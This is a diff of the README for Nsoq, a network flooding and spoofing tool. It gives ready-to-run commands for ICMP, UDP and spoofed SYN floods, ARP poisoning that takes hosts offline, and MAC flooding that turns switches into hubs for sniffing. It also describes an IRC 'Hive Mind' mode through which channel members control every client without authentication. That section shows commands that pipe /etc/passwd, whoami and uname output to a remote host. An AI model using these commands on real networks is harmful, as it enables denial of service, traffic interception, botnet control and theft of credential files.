    # nsoq -d www.nsoq.org -Ie -b
-      Send ICMP packets type Echo Request (PING) to server "www.nsoq.org"
-      on super flood mode.
+      Sends ICMP packets type Echo Request (PING) to server "www.nsoq.org"
+      on aggressive flood mode.
 
    # nsoq -d 10.0.0.10 -p 900 -u -b -x 1300
-      Send UDP packets (super flood mode) to host "10.0.0.10" on port 900 with
-      packet size of 1300 bytes. 
+      Sends UDP packets (aggressive flood) to host "10.0.0.10" on port 900 with
+      packet size of 1300 bytes.
 
-   # nsoq -d 10.0.0.10 -Iq -F 10
-      Send ICMP packets (Source Quench type) to host "10.0.0.10" and with flood
-      delay of 10 microseconds. This packet type can decrease the flow of
-      receiver.
+   # nsoq -d 10.0.0.1 -Iq -F 10
+      Sends ICMP packets (Source Quench type) to host "10.0.0.1" and with a 
+      flood delay defined to 10 microseconds. 
+      This packet type can decrease the receiver's flow.
 
    # nsoq -d 10.0.0.10 -s 10.0.0.0 -p 80 -Ts -F 1 -z
-      Send TCP SYN packets to host on port 80, with source IP address defined
-      to "10.0.0.0" and with flood delay of 1 microsecond. This option don't 
-      wait for replies. This attack is also named "Syn Flood (spoofed)".
+      Sends TCP SYN packets to host on port 80, with source IP address defined
+      to "10.0.0.0" and with a flood delay defined to 1 microsecond. 
+      This option doesn't wait for replies. This attack is also named 
+      "Spoofed Syn Flood".
 
 
 
@@ -738,49 +709,47 @@ ____________
                                ARP Poisoning
                                _____________
    
-   Nsoq send packets at the link layer and previously can define the source
-   and destination MAC addresses. Nsoq can manipulate the source MAC address
-   and the source IP address, so can change the ARP cache table of neighbors
-   on the network, causing a DoS or a pre-manipulation of data forwarding to
-   others destinations. A characterization of this kind of action is known as
-   MITM (Man In The Midle), where you can change the ARP table of your
-   neighbors, making them believe they are sending to gateway, where the
-   gateway will be the poisoning sender.
+   Nsoq sends packets at the link layer and can change the source/destination
+   MAC addresses. Nsoq manipulate the source MAC address and the source IP
+   address changing the ARP cache table of neighbors on the network. The
+   characterization of this kind of action is known as MITM (Man In The Midle),
+   cause you can change the ARP table of your neighbors making them believe
+   that gateway is trusted, where the gateway is poisoned.
 
    # nsoq -H FF:FF:FF:FF:FF:FF -s 10.0.0.1 -h AA:BB:CC:DD:EE:FF 
-      Send an ARP REPLY packet to physical BROADCAST saying that the
-      source IP address "10.0.0.1" have now MAC address AA:BB:CC:DD:EE:FF. If
+      Sends an ARP REPLY packet to physical BROADCAST saying that the
+      source IP address "10.0.0.1" has now MAC address AA:BB:CC:DD:EE:FF. If
       the address "10.0.0.1" is alive on the network, then it will be
-      unavaiable for minutes on state of offline for physical comunication.
+      unavailable for few minutes (out of physical communication).
 
    # nsoq -H FF:FF:FF:FF:FF:FF -h 00:00:00:00:00:00 -s 10.0.0.1 -i eth0 -c
-      Send successively ARP REPLY packets to physical BROADCAST by the eth0
-      interface, and saying that source host "10.0.0.1" have now the MAC
-      address 00:00:00:00:00:00. This option leave the host "10.0.0.1" offline
+      Sends successively ARP REPLY packets to physical BROADCAST by the eth0
+      interface, and saying that source host "10.0.0.1" has now the MAC
+      address 00:00:00:00:00:00. This option puts the host "10.0.0.1" offline
       while the shoots are going.
 
 
 
 
-      MAC Flooding - Buffer overflow on the Switch's ARP Table (CAM TABLE)
-      ____________________________________________________________________
+      MAC Flooding: Buffer overflow on the Switch's ARP Table (CAM TABLE)
+      ___________________________________________________________________
 
-   Nsoq brings the specific option of ARP Flood (MAC FLOODING). This option is
-   controversial, but may well be used for multiple purposes. The option 
-   "-f <num packets>" of Nsoq sends <num packets> to physical BROADCAST with
-   Source and Destination MAC addresses randomly generated, and Source and
-   Destination IP addresses randomly generated. The intent of this type of
-   transmission is overloading the temporary ARP cache table that the switches
-   holds. Doing this type of shooting in a massive mode, you can exhaust the
-   memory buffer storage table of the switchs, which it will enter in
-   "Fail Open" mode. On this stage, the switch will send all packets to all
-   ports on device (HUB mode), facilitating a process of sniffer NO-UNICAST
-   of any host on the network.
+   Nsoq brings one specific option: ARP Flood (MAC FLOODING). This option is
+   controversial, but is used for multiple purposes. The Nsoq option "-f (num
+   packets)" sends (num packets) to physical BROADCAST with Source and
+   Destination MAC addresses randomly generated, and with Source and 
+   Destination IP addresses randomly generated too. The intent of this type of
+   transmission is overloading the temporary ARP cache table of switches. 
+   Doing this shooting in a massive mode, you can exhaust the memory buffer 
+   storage table of the switch, which it will enter in "Fail Open" mode. 
+   On this stage, the switch will send all packets to all ports on the device
+   (HUB mode), facilitating a process of sniffer NO-UNICAST of any host on 
+   the network.
 
    # nsoq -f 140000
       Sets nsoq to send 140000 ARP REPLY packets to physical BROADCAST with
       source and destination MAC address, source and destination IP address
-      generated randomly. If the memory buffer of the switch (CAM Table) is
+      generated randomly. If the switch's memory buffer (CAM Table) is
       less than 140000, then the switch will enter on "Fail Open mode".
 
 
@@ -795,130 +764,120 @@ ____________
                        RSOI - Remote System over IRC 
 
 
-   Since version 1.7, Nsoq enabled the RSOI (Hive Mind) option for external
-   use. This control is managed by an IRC channel, where a central controller
-   through commands given on the arbitrary channel of an IRC server can
-   remotely control all the clients (Nsoq) connected to this channel. This
-   option can only be used through an IRC network, cause Nsoq was developed
+   Since 1.7 version, Nsoq has enabled the RSOI (Hive Mind) option for external
+   use. This control is totally managed by an IRC channel, where a central
+   controller (through commands given on the arbitrary channel of an IRC server)
+   can remotely control all the clients (Nsoq) logged on the channel. This 
+   option cannot be used outside an IRC network, because Nsoq was developed 
    waiting a communication over an IRC protocol.
 
-   Inside this option, the user no more have control over the tool, giving all
-   and all control to IRC #channel. In other words, using RSOI mode you
-   surrender control of Nsoq and ALL SELF MACHINE to all on IRC #channel, who
-   can manipulate it and use all local resources of host without any
-   authentication. 
+   Inside this option, the user no more has control over the tool, giving all
+   your control to the IRC #channel. In other words, using RSOI mode you give
+   total control of Nsoq and the local MACHINE to all on IRC #channel, who can
+   manipulate and use the local resources without any authentication.
 
-   This option is DANGEROUS, and sometimes can sounds like a backdoor or maybe
-   surrender yourself by remote control. 
-   Obviously, i don't care about this idea.
+   Otherwise, is useful for:
 
-   Otherwise, is useful (for example) for:
+   (*) To Check the limit link of the remote host, where a controller may join 
+   many users at a channel, and then with a single shoot to make all the NSOQs 
+   clients at same time responding to this command, triggering packets to a 
+   specific target and checking the loading limitations.
 
-   -> To Check the limit link of remote host, where a controller may join many
-   users at a channel, and then with a single shoot to make all the NSOQs
-   clients at same time responding to this command, triggering packets to a
-   specific target and checking the loading limitations. 
-
-   -> FTP mode, using the IRC channel to management specific files transfer
+   (*) FTP mode, using the IRC channel to manage the specific file transfer
    over trusted machines.
 
 
-   Example:
+   Examples:
 
-                        # nsoq -N irc.quakenet.org
-      (If no channel is giving, default #nsoq channel is used)
-      (If no password is giving, default 'nsoqpass' channel's password is used)
+   # nsoq -N irc.quakenet.org
+      (If no channel is given, default #nsoq channel is used)
+      (If no password is given, default 'nsoqpass' channel's password is used)
 
 
-   - The option above sets Nsoq to enter on IRC Server "irc.quakenet.com" on
-   channel #nsoq (default). After action, Nsoq will NOT accept any command
-   from user, where Nsoq only will responds to commands that arrive from 
-   "irc.quakenet.org" on #nsoq. If many Nsoq clients are on channel in
-   this moment, so the general controller will be able to control all NSOQs
-   clients by your self command. Absolutely, all Nsoq will respond to it.
-
+   This option sets Nsoq to enter on IRC Server "irc.quakenet.com" (#nsoq 
+   channel by default). If Nsoq has logged without errors, the client will NOT
+   accept any command from the user, cause Nsoq only will respond to commands 
+   that arrive from IRC server (#nsoq channel). If many Nsoq clients are logged
+   in, all clients will be controlled by anyone that have write access to 
+   channels. Therefore, all the clients will execute the commands typed in 
+   the channel. 
 
                  # nsoq -N irc.quakenet.org -L Cybers
-              (#Cybers channel defined on Nsoq connection)
+              (#Cybers channel defined in Nsoq connection)
 
                                 (or)
 
             # nsoq -N irc.quakenet.org -L Cybers -G pass
-     (Password "pass" defined to #Cybers channel on Nsoq connection)
+     (Password "pass" defined to #Cybers channel in Nsoq connection)
 
    
 
-   After connected to IRC, the channel can send commands to ALL Nsoq clients.
-   These commands need be a specific syntax to differentiate it from normal
-   text typed on channel. Nsoq only understand commands prefixed by syntax:
-   
+   After connected, the channel can send any commands to ALL Nsoq clients.
+   These commands have a specific syntax to differentiate it from normal text
+   typed on channel. Nsoq just understands commands prefixed by syntax:
+
    @!~<space>
    
-   Ie, everything that comes after this syntax will say to all Nsoq clients to
-   see this like an execution command.
-   Example:
+   Ie, everything that comes after this syntax says to all Nsoq clients to use
+   this words like a real execution command:
 
-
-   @!~ nsoq -d hexcodes.org -Ie
+   @!~ nsoq -d nsoq.org -Ie
        That says to ALL Nsoq clients connected on the channel to send an ICMP
-       Echo Request (Ping) to "www.hexcoees.org" server. 
+       Echo Request (Ping) to "www.nsoq.org" server. 
 
 
    Another example. Sounds like a blind query:
 
    @!~ cat /etc/hosts
-       This command (sent by the #channel) tells to all Nsoq clients run the
+       This command (sent by the #channel) tells to all Nsoq clients to run the
        "cat" command on /etc/passwd file. 
        The result WILL BE NOT SHOWED on IRC channel.
 
 
-   One more example, and SO MUCH MORE DANGEROUS ( ...):
+   One more example and SO MUCH MORE DANGEROUS:
 
-          @!~ cat /etc/passwd | nsoq -d hexcodes.org -Tc -p 123
+   @!~ cat /etc/passwd | nsoq -d nsoq.org -Tc -p 123
 
-   This command (sent by the #channel) tells to all Nsoq clients run a
-   "cat" command on /etc/passwd file and send result to remote host 
-   'hexcodes'. If the 'hexcodes' host is listening on port 123 with Nsoq or
-   Netcat (ie), the content of /etc/passwd file will be transfered.
+      SO MUCH MORE DANGEROUS:
+      This command (sent by the #channel) tells to all Nsoq clients run a cat
+      command on '/etc/passwd' file and send result to remote host nsoq.org. If
+      the nsoq.org is listening on port 123 with Nsoq or Netcat (ie), the
+      content of remote '/etc/passwd' file will be transferred. 
 
    Conclusion:
-   So, we don't need spawn a shell, cause we already have one dedicated shell
-   under RSOI mode across the IRC channel.
+   So we don't need spawn a shell, cause we already have one dedicated shell
+   under RSOI mode across the IRC channel. Such this:
 
-          @!~ ls -al /etc | nsoq -d hexcodes.org -Tc -p 123
+      @!~ ls -al /etc | nsoq -d nsoq.org -Tc -p 123
 
-          @!~ whoami | nsoq -d hexcodes.org -Tc -p 123
+      @!~ whoami | nsoq -d nsoq.org -Tc -p 123
 
-          @!~ uname -a | nsoq -d hexcodes.org -Tc -p 123
+      @!~ uname -a | nsoq -d nsoq.org -Tc -p 123
 
-          @!~ grep root /etc/passwd | nsoq -d hexcodes.org -Tc -p 123
+      @!~ grep root /etc/passwd | nsoq -d nsoq.org -Tc -p 123
 
 
-______________________________________________________________________________
+
+_____________________________________________________________________________
 
 SECURITY:
-_________
 
-   Nsoq needs superuser privileges (root) for operation and execution. DO NOT
-   use the stick bit to allow root privilegies. This is not recommended and
-   may allow involuntary or agressive DoS/DDoS attacks. The privileged Nsoq
-   use also allows users manipulate the ARP cache table of neighbors on
-   network, or put the system over a remote control.
-
-
+   Nsoq needs superuser privileges (root) for execution. DO NOT use the bit
+   SUID to allow root privileges. This is not recommended and may allow
+   involuntary or aggressive DoS/DDoS attacks. The privileged use of Nsoq also
+   allows users manipulate the ARP cache table of neighbors on network, or put
+   all the system over a remote control.
 
 
 ______________________________________________________________________________
 
 DISPONIBILITY:
-______________
 
-   Nsoq is available to anyone who wants to know, manipulate, or disassembly
-   the tool. Nsoq is licensed under GPL and Free Software Foundation. A copy
-   of the license accompanies the software. 
-   Licensed under GPL 3 - Copyright (C) Felipe Ecker.
+   Nsoq is licensed under GPL and Free Software Foundation.
+   A copy of the license accompanies the software.
+   Licensed under GPL 3 - (C) Copyright).
 
-   Nsoq can be freely downloaded here: http://www.nsoq.org
+   The Nsoq can be freely downloaded here: http://www.nsoq.org.
 
                                   Thank you.
 
